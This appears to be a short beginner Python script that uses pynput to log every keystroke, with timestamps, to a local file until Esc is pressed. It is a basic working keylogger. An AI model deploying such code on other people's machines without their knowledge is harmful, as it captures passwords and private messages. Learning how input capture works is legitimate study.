#library
from pynput.keyboard import Key, Listener

#vanilla
import logging

#making a log directory
#log_dir = ""

#defining the formatting of the log file.
FORMAT = '%(asctime)s: %(message)s:'

#basic logging function
#logging.basicConfig(filename=(log_dir + 'key_log.txt'), format='%s')
logging.basicConfig(filename='key_log.txt', filemode='w', level=logging.DEBUG, format=FORMAT)

#this is from the library
def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        #stop listener
        return False

#this says, listener is on
with Listener(on_press=on_press) as listener:
    listener.join()
